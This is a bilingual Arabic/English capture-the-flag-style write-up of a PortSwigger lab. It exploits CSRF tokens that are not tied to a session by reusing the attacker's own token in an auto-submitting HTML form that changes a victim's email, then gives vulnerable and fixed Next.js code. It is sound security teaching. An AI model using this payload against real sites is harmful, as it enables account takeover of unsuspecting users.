# Lab: CSRF where token is not tied to user session

> **Category:** CSRF  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة CSRF في وظيفة تغيير البريد الإلكتروني. الموقع يستخدم CSRF Tokens، ولكن **التوكن غير مربوط بجلسة المستخدم**. هذا يعني أن التوكن الصالح لأي مستخدم يمكن استخدامه لمهاجمة مستخدم آخر.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول إلى حسابين

لدينا حسابين:
- `wiener:peter`
- `carlos:montoya`

### الخطوة 2: الحصول على CSRF Token من حساب wiener

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account**
- غير البريد الإلكتروني واعترض الطلب في Burp
- انسخ قيمة `csrf` من الطلب
- **لا ترسل الطلب** (أفلته)

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_WIENER

email=wiener%40normal-user.net&csrf=TOKEN_FROM_WIENER
```

### الخطوة 3: اختبار التوكن على حساب carlos

- افتح نافذة تصفح خاصة (Private/Incognito)
- سجل الدخول بـ `carlos:montoya`
- اذهب إلى **My account**
- أرسل طلب تغيير البريد إلى Repeater
- استبدل `csrf` بالقيمة التي أخذتها من حساب wiener

```http
POST /my-account/change-email HTTP/1.1
Cookie: session=SESSION_CARLOS

email=carlos%40hacked.net&csrf=TOKEN_FROM_WIENER
```

**لاحظ:** الطلب ينجح! لأن التوكن غير مربوط بجلسة المستخدم.

### الخطوة 4: الحصول على توكن جديد (لأن التوكن مرة واحدة)

التوكنات هنا **Single-use** (تستخدم مرة واحدة فقط). لذلك نحتاج إلى:
1. تسجيل الدخول بـ `wiener`
2. أخذ توكن جديد
3. استخدامه فوراً في الهجوم

### الخطوة 5: إنشاء HTML للهجوم

استخدم هذا القالب مع التوكن الجديد:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="carlos%40attacker.net">
    <input type="hidden" name="csrf" value="FRESH_TOKEN_FROM_WIENER">
</form>
<script>
    document.forms[0].submit();
</script>
```

### الخطوة 6: رفع الهجوم إلى Exploit Server

- اضغط **Go to exploit server**
- في حقل **Body**، الصق الـ HTML
- اضغط **Store**

### الخطوة 7: تجربة الهجوم

- اضغط **View exploit**
- تحقق من أن البريد تغير

### الخطوة 8: تسليم الهجوم للضحية

- اضغط **Deliver to victim**
- تم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما معنى التوكن غير مربوط بالجلسة؟** | التوكن الصالح لأي مستخدم يمكن استخدامه لمستخدم آخر |
| **لماذا نجح الهجوم؟** | الخادم يتحقق فقط من أن التوكن موجود وصالح، وليس من أنه يخص هذا المستخدم |
| **التحدي هنا؟** | التوكنات مرة واحدة (Single-use)، لذلك نحتاج توكن جديد لكل هجوم |
| **كيف حصلنا على التوكن؟** | باستخدام حساب wiener (الذي نملكه) لاستخراج توكن صالح |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يتحقق من صحة التوكن، ولكنه **لا يتحقق** من أن هذا التوكن يخص المستخدم الذي يرسل الطلب.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// تخزين التوكنات في قاعدة بيانات عامة (غير مرتبطة بالمستخدم)
const validTokens = new Set(); // جميع التوكنات الصالحة

export default function handler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;

  // خطأ: يتحقق فقط من وجود التوكن في القائمة العامة
  if (!validTokens.has(csrf)) {
    return res.status(403).send('Invalid CSRF token');
  }

  // إزالة التوكن بعد الاستخدام (single-use)
  validTokens.delete(csrf);

  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// تخزين التوكنات مرتبطة بجلسة المستخدم
const userTokens = new Map(); // sessionId -> token

export default function handler(req, res) {
  const { email, csrf } = req.body;
  const { sessionId } = req.cookies;

  // التصحيح: التحقق من أن التوكن يخص هذه الجلسة بالضبط
  const expectedToken = userTokens.get(sessionId);
  
  if (!expectedToken || expectedToken !== csrf) {
    return res.status(403).send('Invalid CSRF token');
  }

  // إزالة التوكن بعد الاستخدام
  userTokens.delete(sessionId);

  const user = getUserBySession(sessionId);
  updateUserEmail(user.id, email);
  res.send('Email updated');
}

// عند إنشاء جلسة جديدة، يتم توليد توكن خاص بها
function createSession(userId) {
  const sessionId = generateSessionId();
  const csrfToken = generateCsrfToken();
  userTokens.set(sessionId, csrfToken);
  return sessionId;
}
```

**الخلاصة:** التوكن يجب أن يكون **مرتبطاً بجلسة المستخدم** وليس عاماً.

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **ربط التوكن بالجلسة:** كل توكن يخص مستخدم معين وجلسة معينة.
2. **لا تستخدم توكنات عامة:** التوكن يجب أن يكون مرتبطاً بالمستخدم.
3. **توليد توكن جديد لكل جلسة:** أو لكل طلب حساس.
4. **صلاحية محددة:** التوكن ينتهي بانتهاء الجلسة أو بعد الاستخدام.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
- [CSRF Cheat Sheet](https://portswigger.net/web-security/csrf)
